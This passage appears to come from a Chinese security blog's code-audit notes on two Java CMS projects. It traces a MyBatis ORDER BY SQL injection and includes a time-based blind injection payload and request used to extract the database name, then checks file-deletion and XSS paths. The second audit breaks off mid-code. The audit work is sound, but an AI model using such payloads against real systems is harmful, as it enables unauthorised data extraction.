class="line">        order by</span><br><span class="line">        <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;sortWrapper.entrySet()&quot;</span> <span class="attr">index</span>=<span class="string">&quot;s&quot;</span> <span class="attr">item</span>=<span class="string">&quot;o&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span>&gt;</span></span><br><span class="line">            `$&#123;s&#125;` $&#123;o&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;offset != null and limit != null&quot;</span>&gt;</span></span><br><span class="line">        limit #&#123;offset&#125;, #&#123;limit&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​我们向上追溯：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@Transactional(rollbackFor = Exception.class)</span></span><br><span class="line">    <span class="keyword">public</span> PageResponse&lt;UploadDTO&gt; <span class="title function_">findImageByPage</span><span class="params">(Integer page, Integer limit, String sort, String order, String key, String userId)</span> &#123;</span><br><span class="line">        <span class="type">QueryWrapperBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QueryWrapperBuilder</span>();</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(sort) || StringUtils.isEmpty(order)) &#123;</span><br><span class="line">            builder.sort(<span class="string">&quot;ts&quot;</span>, <span class="string">&quot;desc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            builder.sort(sort, order);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">/*此处代码省略*/</span></span><br><span class="line">        <span class="type">QueryWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> builder.build();</span><br><span class="line"></span><br><span class="line">        List&lt;Upload&gt; uploads = uploadDAO.selectWithQuery(wrapper);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">total</span> <span class="operator">=</span> uploadDAO.countWithQuery(wrapper);</span><br><span class="line"><span class="comment">/*此处代码省略*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​可见该注入点的SQL注入与上一个SQL的漏洞是相同的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(value = &quot;/list&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Result&lt;PageResponse&lt;UploadDTO&gt;&gt;&gt; <span class="title function_">queryPage</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;page&quot;)</span> <span class="meta">@Min(value = 1, message = &quot;page不能小于1&quot;)</span> Integer page,</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;limit&quot;)</span> <span class="meta">@Min(value = 1, message = &quot;limit不能小于1&quot;)</span> Integer limit,</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;sort&quot;, required = false)</span> String sort,</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;order&quot;, required = false)</span> String order,</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;key&quot;, required = false)</span> String key)</span> &#123;</span><br><span class="line"></span><br><span class="line">    PageResponse&lt;UploadDTO&gt; response = uploadService.findImageByPage(page, limit, sort, order, key, <span class="built_in">super</span>.getUserId());</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.status(HttpStatus.OK).body(Result.success(response));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​不过在前端测试之前，由于作者似乎尚未实现上传图片的方法，因此我们需要先在数据库中插入一条数据，保证order by会被执行，而不是由于没有数据而发生短路：</p><p><img src="/img/wormhole-cms/image-20241216115905793.png" alt="image-20241216115905793"></p><p>​那么我们接下来只需要构造如下数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/manage/image/list?page=1&amp;limit=10&amp;sort=id&amp;order=desc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.23.192.1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=FDA8E97A658F3DE8725A3002F1A847E6</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer eyJ1aWQiOiIzYTEzOGJhYS0yYWZhLTQwZWMtOGVlMy03NjEyNTg2Y2UzZmIiLCJ0cyI6IjE3MzQzMTM2MDYyNjcifQ==.MGE2M2JlZTE2MmViNDVjYjY4ZTc1NDk2ZjQzOWVlZmI=</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Microsoft Edge&quot;;v=&quot;131&quot;, &quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://172.23.192.1/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=1, i</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​再构造payload：</p><p>sort:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">%</span><span class="number">60</span>,if(length((<span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>database()))<span class="operator">%</span><span class="number">5e1</span>,sleep(<span class="number">0.5</span>),<span class="number">1</span>),<span class="operator">%</span><span class="number">60</span>id</span><br></pre></td></tr></table></figure><p>order:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">desc</span></span><br></pre></td></tr></table></figure><p>​使用BP爆破模块爆破：</p><p><img src="/img/wormhole-cms/image-20241216115635882.png" alt="image-20241216115635882"></p><p>​处理数据后得到库名：</p><p><img src="/img/wormhole-cms/image-20241216115701645.png" alt="image-20241216115701645"></p><p>​除此之外，在src&#x2F;main&#x2F;resources&#x2F;mapper&#x2F;UserMapper.xml中也存在同样的SQL注入漏洞，这里由于篇幅限制，就不写出了，有兴趣的师傅可以自行尝试。</p><h3 id="任意文件操控"><a href="#任意文件操控" class="headerlink" title="任意文件操控"></a>任意文件操控</h3><p>​我们来到文件的控制器发现他，他仅有两个方法，确实没有图片上传的实现，而另一个查询则是从数据库中查询信息，没有可操控的参数，也就不存在任意文件查看了，那么我们关注唯一一个删除的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@DeleteMapping</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Result&lt;Object&gt;&gt; <span class="title function_">deleteByIds</span><span class="params">(<span class="meta">@RequestBody</span> <span class="meta">@Validated</span> IdsDTO dto)</span> &#123;</span><br><span class="line">    uploadService.deleteByIds(dto.getIds());</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.status(HttpStatus.OK).body(Result.success());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional(rollbackFor = Exception.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteByIds</span><span class="params">(List&lt;String&gt; ids)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!CollectionUtils.isEmpty(ids)) &#123;</span><br><span class="line">        <span class="type">QueryWrapperBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QueryWrapperBuilder</span>();</span><br><span class="line">        builder.in(<span class="string">&quot;id&quot;</span>, ids);</span><br><span class="line">        List&lt;Upload&gt; uploads = uploadDAO.selectWithQuery(builder.build());</span><br><span class="line">        <span class="keyword">for</span> (Upload upload : uploads) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> SysUtils.pwd() + upload.getPath();</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">            <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">                file.delete();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        uploadDAO.batchDelete(ids);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​该方法是通过用户传入的文件ID从数据库中获取文件的信息，然后通过数据库中的信息去删除文件，所以这里文件的信息是无法操控的，因此也就不存在任意文件操控。</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(value = &quot;/list&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Result&lt;PageResponse&lt;UserDTO&gt;&gt;&gt; <span class="title function_">queryPage</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;page&quot;)</span> <span class="meta">@Min(value = 1, message = &quot;page不能小于1&quot;)</span> Integer page,</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;limit&quot;)</span> <span class="meta">@Min(value = 1, message = &quot;limit不能小于1&quot;)</span> Integer limit,</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;sort&quot;, required = false)</span> String sort,</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;order&quot;, required = false)</span> String order,</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;roleIds[]&quot;, required = false)</span> List&lt;String&gt; roleIds,</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;key&quot;, required = false)</span> String key)</span> &#123;</span><br><span class="line">    PageResponse&lt;UserDTO&gt; response = userService.findByPage(page, limit, sort, order, key, roleIds);</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.status(HttpStatus.OK).body(Result.success(response));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​对于这个用户管理模块的控制器，可见，他在返回前没有对查询返回的结果和传入参数进行防止XSS注入的处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional(rollbackFor = Exception.class)</span></span><br><span class="line"><span class="keyword">public</span> PageResponse&lt;UserDTO&gt; <span class="title function_">findByPage</span><span class="params">(Integer page, Integer limit, String sort, String order, String key, List&lt;String&gt; roleIds)</span> &#123;</span><br><span class="line">    Set&lt;String&gt; userIds = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (!CollectionUtils.isEmpty(roleIds)) &#123;</span><br><span class="line">        List&lt;UserRoleRef&gt; userRoleRefs = userRoleRefService.findByRoleIds(roleIds);</span><br><span class="line">        <span class="keyword">if</span> (!CollectionUtils.isEmpty(userRoleRefs)) &#123;</span><br><span class="line">            userRoleRefs.forEach(userRoleRef -&gt; userIds.add(userRoleRef.getUserId()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PageResponse</span>&lt;&gt;(<span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">QueryWrapperBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QueryWrapperBuilder</span>();</span><br><span class="line">    builder.sort(<span class="string">&quot;builtin&quot;</span>, <span class="string">&quot;desc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isEmpty(sort) || StringUtils.isEmpty(order)) &#123;</span><br><span class="line">        builder.sort(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;asc&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        builder.sort(sort, order);</span><br><span class="line">    &#125;</span><br><span class="line">    builder.like(!StringUtils.isEmpty(key), key, Arrays.asList(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;telephone&quot;</span>, <span class="string">&quot;email&quot;</span>));</span><br><span class="line">    builder.page((page - <span class="number">1</span>) * limit, limit);</span><br><span class="line">    builder.in(<span class="string">&quot;id&quot;</span>, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(userIds));</span><br><span class="line">    <span class="type">QueryWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> builder.build();</span><br><span class="line"></span><br><span class="line">    List&lt;User&gt; users = userDAO.selectWithQuery(wrapper);</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">total</span> <span class="operator">=</span> userDAO.countWithQuery(wrapper);</span><br><span class="line"></span><br><span class="line">    List&lt;UserDTO&gt; dtos = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (User user : users) &#123;</span><br><span class="line">        <span class="type">UserDTO</span> <span class="variable">userDTO</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserDTO</span>();</span><br><span class="line">        BeanUtils.copyProperties(user, userDTO);</span><br><span class="line">        userDTO.setPassword(<span class="literal">null</span>);</span><br><span class="line">        List&lt;RoleDTO&gt; roles = roleService.findByUserId(user.getId());</span><br><span class="line">        userDTO.setRoles(roles);</span><br><span class="line">        dtos.add(userDTO);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PageResponse</span>&lt;&gt;(total, dtos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里也是同样的，对于查询出的结果以及传入的参数没有进行防止XSS的处理，但是这里并没有将传入的参数key嵌入前端页面，所以这里是不存在反射型XSS的，但是查询结果是嵌入了的，所以存储型XSS仍旧值得一试。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Result&lt;Object&gt;&gt; <span class="title function_">save</span><span class="params">(<span class="meta">@RequestBody</span> <span class="meta">@Validated(UserDTO.Insert.class)</span> UserDTO dto)</span> &#123;</span><br><span class="line">    userService.save(dto);</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.status(HttpStatus.OK).body(Result.success());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里是用户管理模块中的新建用户的保存控制器，我们可以看到没有进行防XSS的处理，那么我们追溯save方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional(rollbackFor = Exception.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">(UserDTO dto)</span> &#123;</span><br><span class="line">    <span class="comment">//校验数据</span></span><br><span class="line">    <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> findByUsername(dto.getUsername());</span><br><span class="line">    <span class="keyword">if</span> (u != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BusinessException</span>(<span class="string">&quot;用户名重复&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    BeanUtils.copyProperties(dto, user);</span><br><span class="line">    user.setId(UUID.randomUUID().toString());</span><br><span class="line">    user.setBuiltin(<span class="number">0</span>);</span><br><span class="line">    user.setEnable(<span class="number">1</span>);</span><br><span class="line">    user.setTs(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">    user.setPassword(<span class="keyword">new</span> <span class="title class_">BCryptPasswordEncoder</span>().encode(user.getPassword()));</span><br><span class="line">    userDAO.insert(user);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">roleId</span> <span class="operator">=</span> roleService.findIdByName(<span class="string">&quot;guest&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (roleId != <span class="literal">null</span>) &#123;</span><br><span class="line">        userRoleRefService.save(<span class="keyword">new</span> <span class="title class_">UserRoleRef</span>(UUID.randomUUID().toString(), user.getId(), roleId, <span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​审计我们可知，检查了用户名是否重复，设置了用户的个人信息，可见依旧没有对XSS进行防御，所以这里在新建用户时是存在一个存储型XSS的。</p><p>​我们尝试存储型XSS：</p><p><img src="/img/wormhole-cms/image-20241216133642497.png" alt="image-20241216133642497"></p><p>​可见这里的&lt;被转义了，回顾项目结构我们知道这个项目是存在过滤器的，但是我并没有找到过滤器的文件，而这里的特殊字符也确实被转义了，也就是不存在XSS。<br>   至此此项目审计完毕。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code Audit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cs_singlewindow_cms</title>
      <link href="/2024/12/10/cs_singlewindow_cms/"/>
      <url>/2024/12/10/cs_singlewindow_cms/</url>
      
        <content type="html"><![CDATA[<h2 id="项目技术栈"><a href="#项目技术栈" class="headerlink" title="项目技术栈"></a>项目技术栈</h2><h3 id="后端技术"><a href="#后端技术" class="headerlink" title="后端技术"></a>后端技术</h3><p>SpringBoot：提供了对Spring开箱即用的功能。简化了Spring配置，提供自动配置 auto-configuration功能。</p><p>Spring：是提供了IoC等功能，是目前最流行的Java企业级开发框架。</p><p>SpringMVC：MVC框架，使用方便，Bug较少。</p><p>JPA：持久化框架。属于JSR标准，JPA实现选择最常用的Hibernate。</p><p>SpringDataJPA：对JPA封装，大部分查询只需要在接口中写方法，而不需要实现改方法，极大开发效率。</p><p>QueryDSL：实现类型安全的JPA查询，使用对象及属性实现查询，避免编写jpql出现的拼错字符及属性名记忆负担。</p><p>FreeMarker：模板组件。</p><p>Shiro：安全组件。配置简便。</p><p>Lucene：全文检索组件。实现对中文的分词搜索。</p><p>Ehcache：缓存组件。主要用在JPA二级缓存、Shiro权限缓存。</p><p>Quartz：定时任务组件。</p><h3 id="前端技术"><a href="#前端技术" class="headerlink" title="前端技术"></a>前端技术</h3><p>jQuery：JavaScript库。</p><p>Bootstrap：响应式设计前端框架。</p><p>AdminLTE：后台管理平台开源框架。</p><p>jQuery UI：基于jQuery的UI框架。</p><p>jQuery Validation：基于jQuery的表单校验框架。</p><p>UEditor：Web富文本编辑器。</p><p>Editor.md：基于Markdown语法的Web文本编辑器。</p><p>ECharts：用于生成图标的组件。</p><p>My97DatePicker：日期组件。</p><p>zTree：树组件。</p><h2 id="项目依赖审计"><a href="#项目依赖审计" class="headerlink" title="项目依赖审计"></a>项目依赖审计</h2><p>​项目为maven项目，因此来到pom.xml文件审计。</p><p>​经审计发现，该项目引入中并不存在已披露的漏洞。</p><h2 id="单点漏洞审计"><a href="#单点漏洞审计" class="headerlink" title="单点漏洞审计"></a>单点漏洞审计</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="cs-singlewindow-cms-master-src-main-java-com-jspxcms-core-repository-InfoDao-java（失败）"><a href="#cs-singlewindow-cms-master-src-main-java-com-jspxcms-core-repository-InfoDao-java（失败）" class="headerlink" title="cs_singlewindow_cms-master\src\main\java\com\jspxcms\core\repository\InfoDao.java（失败）"></a>cs_singlewindow_cms-master\src\main\java\com\jspxcms\core\repository\InfoDao.java（失败）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Query(&quot;select count(*) from Info bean where bean.node.id in (?1) and bean.status!=&#x27;&quot; + Info.DELETED + &quot;&#x27;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">countByNodeIdNotDeleted</span><span class="params">(Collection&lt;Integer&gt; nodeIds)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Query(&quot;select count(*) from Info bean where bean.org.id in (?1) and bean.status!=&#x27;&quot; + Info.DELETED + &quot;&#x27;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">countByOrgIdNotDeleted</span><span class="params">(Collection&lt;Integer&gt; orgIds)</span>;</span><br></pre></td></tr></table></figure><p>​发现这里使用了动态拼接，但是参数无法控制。</p><h4 id="cs-singlewindow-cms-master-src-main-java-com-jspxcms-core-repository-impl-MessageDaoImpl-java（失败）"><a href="#cs-singlewindow-cms-master-src-main-java-com-jspxcms-core-repository-impl-MessageDaoImpl-java（失败）" class="headerlink" title="cs_singlewindow_cms-master\src\main\java\com\jspxcms\core\repository\impl\MessageDaoImpl.java（失败）"></a>cs_singlewindow_cms-master\src\main\java\com\jspxcms\core\repository\impl\MessageDaoImpl.java（失败）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> JpqlBuilder <span class="title function_">groupByUserId</span><span class="params">(Integer userId, <span class="type">boolean</span> unread)</span> &#123;</span><br><span class="line">        ...省略...</span><br><span class="line">        <span class="keyword">if</span> (unread) &#123;</span><br><span class="line">            jb.append(<span class="string">&quot;having number_of_unread_&gt;0&quot;</span>);</span><br><span class="line">            jb.setCountQueryString(<span class="string">&quot;select count(*) from (&quot;</span> + jb.getQueryString() + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            jb.setCountProjection(<span class="string">&quot;distinct contact_id_&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ...省略...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​未被控制器调用。</p><p>​审计了删改增也没有发现漏洞，虽然也存在动态拼接但是也都无法操控。</p><h3 id="任意文件操控"><a href="#任意文件操控" class="headerlink" title="任意文件操控"></a>任意文件操控</h3><p>​我们来到文件上传的控制器</p><h4 id="src-main-java-com-jspxcms-core-web-back-WebFileUploadsController-java（成功）"><a href="#src-main-java-com-jspxcms-core-web-back-WebFileUploadsController-java（成功）" class="headerlink" title="src&#x2F;main&#x2F;java&#x2F;com&#x2F;jspxcms&#x2F;core&#x2F;web&#x2F;back&#x2F;WebFileUploadsController.java（成功）"></a>src&#x2F;main&#x2F;java&#x2F;com&#x2F;jspxcms&#x2F;core&#x2F;web&#x2F;back&#x2F;WebFileUploadsController.java（成功）</h4><h5 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h5><p>控制器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequiresPermissions(&quot;core:web_file_2:upload&quot;)</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;upload.do&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">upload</span><span class="params">(<span class="meta">@RequestParam(value = &quot;file&quot;, required = false)</span> MultipartFile file, String parentId,</span></span><br><span class="line"><span class="params">HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IllegalStateException, IOException &#123;</span><br><span class="line"><span class="built_in">super</span>.upload(file, parentId, request, response);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>文件上传的实现函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">upload</span><span class="params">(MultipartFile file, String parentId, HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="keyword">throws</span> IllegalStateException, IOException &#123;</span><br><span class="line"><span class="type">Site</span> <span class="variable">site</span> <span class="operator">=</span> Context.getCurrentSite();</span><br><span class="line"><span class="comment">// parentId = parentId == null ? base : parentId;</span></span><br><span 